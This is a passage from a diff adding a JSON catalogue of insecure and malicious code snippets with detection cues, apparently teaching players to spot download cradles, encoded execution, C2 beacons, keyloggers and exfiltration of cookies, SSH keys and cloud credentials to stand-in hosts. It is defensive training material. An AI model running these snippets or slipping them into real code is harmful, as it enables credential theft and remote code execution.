+      "snippet": "marshal.loads(base64.b64decode(blob))",
+      "look_for": "unsafe code object load",
+      "why_it_matters": "Deserializes executable objects."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Ruby",
+      "snippet": "ERB.new(params[:tpl]).result(binding)",
+      "look_for": "template from user",
+      "why_it_matters": "Server-side template/code execution."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Java",
+      "snippet": "ScriptEngineManager m = new ScriptEngineManager(); m.getEngineByName(\"js\").eval(code);",
+      "look_for": "script engine eval",
+      "why_it_matters": "RCE via scripting engine."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "JavaScript",
+      "snippet": "setTimeout(req.query.code, 0)",
+      "look_for": "string timer callback",
+      "why_it_matters": "Implicit eval."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Python",
+      "snippet": "ast.literal_eval(request.args[\"obj\"]) # replaced later with eval during debug",
+      "look_for": "eval-style parsing smell",
+      "why_it_matters": "Players should learn this drift pattern."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "JavaScript",
+      "snippet": "await import(req.query.pluginUrl)",
+      "look_for": "runtime code from URL/input",
+      "why_it_matters": "Untrusted code loading."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Python",
+      "snippet": "subprocess.run([\"pip\",\"install\",pkg])",
+      "look_for": "installs package name from input",
+      "why_it_matters": "Supply-chain / dependency confusion risk."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "JavaScript",
+      "snippet": "fetch(\"https://example.invalid/plugin.js\").then(r=>r.text()).then(eval)",
+      "look_for": "download then eval",
+      "why_it_matters": "Code without integrity."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Python",
+      "snippet": "exec(requests.get(url).text)",
+      "look_for": "download and execute",
+      "why_it_matters": "No integrity or provenance."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Bash",
+      "snippet": "curl -fsSL https://example.invalid/install.sh | sh",
+      "look_for": "curl pipe sh",
+      "why_it_matters": "No review/integrity."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "PHP",
+      "snippet": "include \"http://example.invalid/lib.php\";",
+      "look_for": "remote include",
+      "why_it_matters": "Untrusted remote code."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Java",
+      "snippet": "Class.forName(request.getParameter(\"impl\")).newInstance();",
+      "look_for": "attacker chooses implementation",
+      "why_it_matters": "Unexpected class loading."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Go",
+      "snippet": "go run $(cat plugin.txt)",
+      "look_for": "runtime execution of external code",
+      "why_it_matters": "Build/runtime trust failure."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "TypeScript",
+      "snippet": "const policy = JSON.parse(fs.readFileSync(req.body.policyPath,\"utf8\"))",
+      "look_for": "policy/config file chosen by user",
+      "why_it_matters": "Trust boundary confusion."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Python",
+      "snippet": "yaml.load(open(\"config.yml\"), Loader=yaml.Loader)",
+      "look_for": "unsafe loader on mutable config",
+      "why_it_matters": "Integrity + parser issue."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "JavaScript",
+      "snippet": "app.use(require(process.env.MIDDLEWARE))",
+      "look_for": "env-controlled module load",
+      "why_it_matters": "Unexpected code path."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Ruby",
+      "snippet": "gem install #{params[:name]}`",
+      "look_for": "runtime gem install",
+      "why_it_matters": "Dependency abuse."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Java",
+      "snippet": "Files.readString(Paths.get(\"/tmp/rules.json\"))",
+      "look_for": "critical rules from world-writable tmp",
+      "why_it_matters": "Integrity failure."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "Python",
+      "snippet": "os.environ[\"PYTHONPATH\"] = request.args[\"path\"]",
+      "look_for": "runtime import path manipulation",
+      "why_it_matters": "Module hijacking."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Supply Chain / Untrusted Code Loading",
+      "language": "JavaScript",
+      "snippet": "serviceWorker.register(req.query.script)",
+      "look_for": "service worker from untrusted path",
+      "why_it_matters": "Persistent client code trust issue."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "JavaScript",
+      "snippet": "res.setHeader(\"Access-Control-Allow-Origin\", \"*\")",
+      "look_for": "wildcard CORS",
+      "why_it_matters": "Cross-origin data exposure if sensitive endpoints rely on cookies/tokens improperly."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "TypeScript",
+      "snippet": "app.use(cors({ origin: true, credentials: true }))",
+      "look_for": "reflective CORS + credentials",
+      "why_it_matters": "Browser trust boundary confusion."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Python",
+      "snippet": "return redirect(request.args[\"next\"])",
+      "look_for": "redirect target from user",
+      "why_it_matters": "Open redirect / phishing helper."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "PHP",
+      "snippet": "header(\"Location: \" . $_GET[\"url\"]);",
+      "look_for": "user-controlled redirect",
+      "why_it_matters": "Open redirect."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Ruby",
+      "snippet": "redirect_to params[:return_to]",
+      "look_for": "return_to from params",
+      "why_it_matters": "Open redirect."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Java",
+      "snippet": "response.sendRedirect(request.getParameter(\"url\"));",
+      "look_for": "unvalidated redirect",
+      "why_it_matters": "External redirect."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "JavaScript",
+      "snippet": "app.post(\"/transfer\", (req,res)=> bank.move(req.body))",
+      "look_for": "state-changing endpoint with no CSRF guard",
+      "why_it_matters": "CSRF risk in cookie-auth apps."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Python",
+      "snippet": "if request.method == \"POST\": change_email()",
+      "look_for": "POST state change shown without CSRF token",
+      "why_it_matters": "Framework-level CSRF gap."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "PHP",
+      "snippet": "echo $_SERVER[\"HTTP_ORIGIN\"];",
+      "look_for": "blindly trusting Origin header",
+      "why_it_matters": "Origin reflection smell."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "JavaScript",
+      "snippet": "app.use((req,res,next)=>{ res.set(\"X-Frame-Options\",\"ALLOWALL\"); next(); })",
+      "look_for": "framing allowed everywhere",
+      "why_it_matters": "Clickjacking exposure."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Python",
+      "snippet": "debug = True",
+      "look_for": "debug mode enabled",
+      "why_it_matters": "Leaky stack traces / unsafe prod config."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Java",
+      "snippet": "spring.h2.console.enabled=true",
+      "look_for": "admin/debug console in prod",
+      "why_it_matters": "Security misconfiguration."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Go",
+      "snippet": "log.Printf(\"reset token=%s\", token)",
+      "look_for": "secret in logs",
+      "why_it_matters": "Sensitive data exposure."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "TypeScript",
+      "snippet": "console.log(\"Authorization\", req.headers.authorization)",
+      "look_for": "auth header logged",
+      "why_it_matters": "Token leakage to logs."
+    },
+    {
+      "type": "insecure",
+      "category": "Misconfiguration: CORS / Redirects / CSRF / Debug",
+      "language": "Ruby",
+      "snippet": "render plain: exception.full_message",
+      "look_for": "full exception detail to users",
+      "why_it_matters": "Internal info disclosure."
+    }
+  ],
+  "malware": [
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "PowerShell",
+      "snippet": "IEX (New-Object Net.WebClient).DownloadString(\"https://payload.invalid/a.ps1\")",
+      "look_for": "IEX; DownloadString; remote script",
+      "why_it_matters": "Classic download cradle."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Bash",
+      "snippet": "curl -fsSL https://payload.invalid/install.sh | bash",
+      "look_for": "curl pipe bash",
+      "why_it_matters": "Downloads and runs in one step."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "JavaScript",
+      "snippet": "require(\"child_process\").exec(\"curl -fsSL https://payload.invalid/x | sh\")",
+      "look_for": "child_process + curl|sh",
+      "why_it_matters": "Spawns shell to fetch payload."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Python",
+      "snippet": "exec(__import__(\"requests\").get(\"https://payload.invalid/p.py\").text)",
+      "look_for": "HTTP fetch then exec",
+      "why_it_matters": "Remote code execution loader."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "PowerShell",
+      "snippet": "powershell -nop -w hidden -c \"iex(iwr https://payload.invalid/p.ps1)\"",
+      "look_for": "nop; hidden; iex; iwr",
+      "why_it_matters": "Very suspicious one-liner."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Bash",
+      "snippet": "wget -qO- https://payload.invalid/dropper.sh | sh",
+      "look_for": "wget -qO- | sh",
+      "why_it_matters": "Fetch-and-run pattern."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Python",
+      "snippet": "os.system(\"python3 -c \\\"import urllib.request;exec(urllib.request.urlopen('https://payload.invalid/p').read())\\\"\")",
+      "look_for": "nested downloader",
+      "why_it_matters": "Remote code run."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "JavaScript",
+      "snippet": "fetch(\"https://payload.invalid/mod.js\").then(r=>r.text()).then(t=>eval(t))",
+      "look_for": "download then eval",
+      "why_it_matters": "Browser-side loader."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "PowerShell",
+      "snippet": "Start-BitsTransfer https://payload.invalid/agent.exe $env:TEMP\\a.exe; Start-Process $env:TEMP\\a.exe",
+      "look_for": "BITS transfer + execute",
+      "why_it_matters": "Ingress tool transfer."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Bash",
+      "snippet": "python3 - <<'PY'\nimport urllib.request,os\np=\"/tmp/x.py\"\nopen(p,\"wb\").write(urllib.request.urlopen(\"https://payload.invalid/x.py\").read())\nos.system(f\"python3 {p}\")\nPY",
+      "look_for": "writes remote code then runs it",
+      "why_it_matters": "Staged downloader."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Java",
+      "snippet": "new URL(\"https://payload.invalid/a.jar\").openStream()",
+      "look_for": "remote JAR fetch",
+      "why_it_matters": "External code staging."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "PHP",
+      "snippet": "eval(file_get_contents(\"https://payload.invalid/payload.txt\"));",
+      "look_for": "remote text into eval",
+      "why_it_matters": "Webshell-style loader."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Ruby",
+      "snippet": "eval(Net::HTTP.get(URI(\"https://payload.invalid/boot.rb\")))",
+      "look_for": "net fetch + eval",
+      "why_it_matters": "Remote Ruby execution."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "Go",
+      "snippet": "exec.Command(\"sh\",\"-c\",\"curl -fsSL https://payload.invalid/g | sh\").Run()",
+      "look_for": "shell download cradle",
+      "why_it_matters": "Explicit fetch and run."
+    },
+    {
+      "type": "malware",
+      "category": "Loader: Download & Execute",
+      "language": "TypeScript",
+      "snippet": "await import(\"https://payload.invalid/mod.mjs\")",
+      "look_for": "dynamic remote import",
+      "why_it_matters": "Untrusted remote module."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "JavaScript",
+      "snippet": "eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))",
+      "look_for": "atob + eval",
+      "why_it_matters": "Base64-obfuscated script."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Python",
+      "snippet": "exec(base64.b64decode(payload))",
+      "look_for": "base64 decode + exec",
+      "why_it_matters": "Encoded code execution."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "PowerShell",
+      "snippet": "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)))",
+      "look_for": "FromBase64String + iex",
+      "why_it_matters": "Encoded PowerShell payload."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Bash",
+      "snippet": "bash -c \"$(echo ZWNobyBoaQ== | base64 -d)\"",
+      "look_for": "base64 decode into shell",
+      "why_it_matters": "Encoded shell."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "JavaScript",
+      "snippet": "Function(Buffer.from(s, \"base64\").toString())()",
+      "look_for": "Buffer decode + Function",
+      "why_it_matters": "Node obfuscated execution."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Python",
+      "snippet": "marshal.loads(zlib.decompress(blob))",
+      "look_for": "decompress + marshal",
+      "why_it_matters": "Packed Python bytecode."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "PowerShell",
+      "snippet": "$x=-bxor 35;$buf=$buf|%{$_ -bxor $x};IEX([Text.Encoding]::UTF8.GetString($buf))",
+      "look_for": "XOR decode + IEX",
+      "why_it_matters": "Simple XOR obfuscation."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "JavaScript",
+      "snippet": "setTimeout(String.fromCharCode(...codes),0)",
+      "look_for": "fromCharCode code assembly",
+      "why_it_matters": "String-built payload."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "VBA",
+      "snippet": "CreateObject(\"Wscript.Shell\").Run StrReverse(payload)",
+      "look_for": "reversed payload string",
+      "why_it_matters": "Obfuscation via reverse."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Python",
+      "snippet": "code=\"\".join(chr(c^7) for c in data); exec(code)",
+      "look_for": "XOR decode loop + exec",
+      "why_it_matters": "Homemade decoder."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "PowerShell",
+      "snippet": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "look_for": "powershell -enc",
+      "why_it_matters": "Highly suspicious encoded command."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "JavaScript",
+      "snippet": "eval(unescape(\"%61%6c%65%72%74%28%31%29\"))",
+      "look_for": "percent-encoded script",
+      "why_it_matters": "Obfuscated JS."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Python",
+      "snippet": "exec(codecs.decode(blob, \"rot_13\"))",
+      "look_for": "simple transform then exec",
+      "why_it_matters": "Decoder + exec combo."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "Bash",
+      "snippet": "eval \"$(printf %b \"\\x65\\x63\\x68\\x6f\")\"",
+      "look_for": "%b hex escapes + eval",
+      "why_it_matters": "Command obfuscation."
+    },
+    {
+      "type": "malware",
+      "category": "Execution: Encoded / Obfuscated",
+      "language": "JavaScript",
+      "snippet": "for(let i=0;i<a.length;i++)a[i]^=0x13; eval(String.fromCharCode(...a))",
+      "look_for": "XOR loop feeding eval",
+      "why_it_matters": "Packed payload behavior."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "JavaScript",
+      "snippet": "setInterval(()=>fetch(\"https://c2.invalid/beacon?u=\"+encodeURIComponent(location.href)),30000)",
+      "look_for": "periodic beacon; external domain",
+      "why_it_matters": "Command-and-control style polling."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Python",
+      "snippet": "while True:\n    requests.post(\"https://c2.invalid/ping\", json={\"host\":socket.gethostname()})",
+      "look_for": "endless external check-in loop",
+      "why_it_matters": "Beacon loop."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "PowerShell",
+      "snippet": "while($true){iwr https://c2.invalid/task -UseBasicParsing; Start-Sleep 30}",
+      "look_for": "infinite polling to remote task URL",
+      "why_it_matters": "Remote tasking."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Go",
+      "snippet": "for { http.PostForm(\"https://c2.invalid/checkin\", url.Values{\"id\":{id}}); time.Sleep(30*time.Second)}",
+      "look_for": "repeated check-ins",
+      "why_it_matters": "Beacon cadence."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Java",
+      "snippet": "scheduler.scheduleAtFixedRate(() -> http(\"https://c2.invalid/beacon\"), 0, 30, SECONDS);",
+      "look_for": "fixed-rate external beacon",
+      "why_it_matters": "Periodic C2."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Ruby",
+      "snippet": "loop do Net::HTTP.get(URI(\"https://c2.invalid/cmd\")); sleep 20; end",
+      "look_for": "loop + remote command fetch",
+      "why_it_matters": "Persistent poller."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "PHP",
+      "snippet": "ignore_user_abort(true); while(true){ file_get_contents(\"https://c2.invalid/pulse\"); sleep(15);} ",
+      "look_for": "long-running web shell beacon",
+      "why_it_matters": "Server-side beaconing."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "JavaScript",
+      "snippet": "new WebSocket(\"wss://c2.invalid/socket\")",
+      "look_for": "outbound WebSocket to control endpoint",
+      "why_it_matters": "Interactive C2 channel."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Python",
+      "snippet": "mqtt.Client().connect(\"c2.invalid\",1883,60)",
+      "look_for": "unexpected MQTT control channel",
+      "why_it_matters": "Non-HTTP beaconing."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Bash",
+      "snippet": "while true; do curl -fsS https://c2.invalid/ok >/dev/null; sleep 60; done",
+      "look_for": "curl loop to remote host",
+      "why_it_matters": "Simple beacon."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "PowerShell",
+      "snippet": "Register-ScheduledJob -ScriptBlock { iwr https://c2.invalid/b } -RunNow",
+      "look_for": "scheduled recurring callback",
+      "why_it_matters": "Beacon persistence."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "JavaScript",
+      "snippet": "navigator.sendBeacon(\"https://c2.invalid/collect\", document.cookie)",
+      "look_for": "sendBeacon to external domain",
+      "why_it_matters": "Stealthy exfil/beacon combo."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Python",
+      "snippet": "websocket.create_connection(\"wss://c2.invalid/live\")",
+      "look_for": "persistent control channel",
+      "why_it_matters": "Live command path."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "Go",
+      "snippet": "grpc.Dial(\"c2.invalid:443\", grpc.WithInsecure())",
+      "look_for": "unexpected outbound control client",
+      "why_it_matters": "Alternative C2 transport."
+    },
+    {
+      "type": "malware",
+      "category": "C2: Beaconing / Call Home",
+      "language": "TypeScript",
+      "snippet": "setInterval(async()=>await got(\"https://c2.invalid/jobs\"), 10000)",
+      "look_for": "interval job polling",
+      "why_it_matters": "Obvious task fetcher."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "JavaScript",
+      "snippet": "fetch(\"https://exfil.invalid/c\", {method:\"POST\", body:document.cookie})",
+      "look_for": "document.cookie to external site",
+      "why_it_matters": "Cookie theft."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "JavaScript",
+      "snippet": "fetch(\"https://exfil.invalid/t?k=\"+localStorage.token)",
+      "look_for": "localStorage token sent out",
+      "why_it_matters": "Token exfiltration."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Python",
+      "snippet": "requests.post(\"https://exfil.invalid/env\", data=os.environ)",
+      "look_for": "environment vars to remote host",
+      "why_it_matters": "Secret exfiltration."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Bash",
+      "snippet": "curl -X POST https://exfil.invalid/p -d @/etc/passwd",
+      "look_for": "POSTing local file",
+      "why_it_matters": "File exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "PowerShell",
+      "snippet": "iwr -Method POST -Uri https://exfil.invalid/u -InFile $env:USERPROFILE\\.ssh\\id_rsa",
+      "look_for": "uploads SSH key",
+      "why_it_matters": "Credential theft."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Java",
+      "snippet": "httpPost(\"https://exfil.invalid/data\", Files.readString(Path.of(\"/etc/hosts\")))",
+      "look_for": "sending local file contents",
+      "why_it_matters": "Data exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Ruby",
+      "snippet": "Net::HTTP.post(URI(\"https://exfil.invalid/creds\"), ENV.to_json)",
+      "look_for": "ENV to remote host",
+      "why_it_matters": "Secrets leakage."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "PHP",
+      "snippet": "file_get_contents(\"https://exfil.invalid/?d=\".urlencode(file_get_contents(\"/etc/passwd\")))",
+      "look_for": "file contents in URL param",
+      "why_it_matters": "Exfil via GET."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "JavaScript",
+      "snippet": "const fd=new FormData(); fd.append(\"f\", fileInput.files[0]); fetch(\"https://exfil.invalid/up\",{method:\"POST\",body:fd})",
+      "look_for": "posting arbitrary file",
+      "why_it_matters": "User/file exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Python",
+      "snippet": "for p in Path.home().rglob(\"*.pem\"): requests.post(\"https://exfil.invalid/f\", files={\"f\":open(p,\"rb\")})",
+      "look_for": "sweeping and uploading keys",
+      "why_it_matters": "Bulk exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Go",
+      "snippet": "body,_:=os.ReadFile(\"/etc/shadow\"); http.Post(\"https://exfil.invalid/x\",\"text/plain\",bytes.NewReader(body))",
+      "look_for": "sensitive file upload",
+      "why_it_matters": "System file theft."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "PowerShell",
+      "snippet": "Get-ChildItem Env: | ConvertTo-Json | % { iwr https://exfil.invalid/e -Method POST -Body $_ }",
+      "look_for": "collecting environment then POST",
+      "why_it_matters": "Environment exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "JavaScript",
+      "snippet": "navigator.sendBeacon(\"https://exfil.invalid/b\", JSON.stringify({ls:{...localStorage}}))",
+      "look_for": "sendBeacon with storage",
+      "why_it_matters": "Stealthy browser exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Python",
+      "snippet": "subprocess.run([\"tar\",\"czf\",\"/tmp/d.tgz\",\"/home/user/.ssh\"]); requests.post(\"https://exfil.invalid/u\", files={\"f\":open(\"/tmp/d.tgz\",\"rb\")})",
+      "look_for": "archive then upload",
+      "why_it_matters": "Staged data theft."
+    },
+    {
+      "type": "malware",
+      "category": "Exfiltration: Cookies / Tokens / Files",
+      "language": "Bash",
+      "snippet": "for f in ~/.aws/*; do curl -X POST https://exfil.invalid/u --data-binary @\"$f\"; done",
+      "look_for": "loop over cloud creds",
+      "why_it_matters": "Credential file exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "JavaScript",
+      "snippet": "document.addEventListener(\"keydown\", e => fetch(\"https://exfil.invalid/k\", {method:\"POST\", body:e.key}))",
+      "look_for": "keydown listener to external host",
+      "why_it_matters": "Keylogger behavior."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Python",
+      "snippet": "for l in pynput.keyboard.Listener(on_press=lambda k: requests.post(\"https://exfil.invalid/k\",data=str(k))): pass",
+      "look_for": "keyboard hook + exfil",
+      "why_it_matters": "Local keylogging."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "PowerShell",
+      "snippet": "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::GetText()",
+      "look_for": "clipboard scraping",
+      "why_it_matters": "Harvesting clipboard secrets."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Bash",
+      "snippet": "history | curl -X POST https://exfil.invalid/h --data-binary @-",
+      "look_for": "shell history upload",
+      "why_it_matters": "Command history theft."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "JavaScript",
+      "snippet": "const pw=document.querySelector(\"input[type=password]\").value; fetch(\"https://exfil.invalid/p\",{method:\"POST\",body:pw})",
+      "look_for": "reads password field and exfils",
+      "why_it_matters": "Credential theft in browser."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Python",
+      "snippet": "browser_cookie3.load()",
+      "look_for": "browser cookie access library",
+      "why_it_matters": "Cookie harvesting."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Go",
+      "snippet": "dbus-send --session --dest=org.freedesktop.secrets ...",
+      "look_for": "secret store access",
+      "why_it_matters": "Credential store scraping."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Java",
+      "snippet": "Files.readString(Path.of(System.getProperty(\"user.home\"), \".npmrc\"))",
+      "look_for": "reads developer token file",
+      "why_it_matters": "Developer credential theft."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Ruby",
+      "snippet": "ENV.select{|k,_| k =~ /KEY|TOKEN|SECRET/}",
+      "look_for": "filtering secrets from env",
+      "why_it_matters": "Secret harvesting."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "PowerShell",
+      "snippet": "Get-Content $env:USERPROFILE\\.git-credentials",
+      "look_for": "credential file read",
+      "why_it_matters": "Source control credential theft."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "JavaScript",
+      "snippet": "const m = await navigator.credentials.get({password:true})",
+      "look_for": "Credential API access attempt",
+      "why_it_matters": "Credential collection smell."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Python",
+      "snippet": "for p in Path.home().rglob(\"*.kdbx\"): print(p)",
+      "look_for": "searching password vault files",
+      "why_it_matters": "Credential target discovery."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Bash",
+      "snippet": "grep -R \"AWS_SECRET_ACCESS_KEY\" ~ 2>/dev/null",
+      "look_for": "grep for secrets",
+      "why_it_matters": "Secret hunting."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "JavaScript",
+      "snippet": "localStorage.getItem(\"authToken\")",
+      "look_for": "explicit auth token read",
+      "why_it_matters": "Often precursor to exfil."
+    },
+    {
+      "type": "malware",
+      "category": "Credential Access: Keylogging / Scraping",
+      "language": "Python",
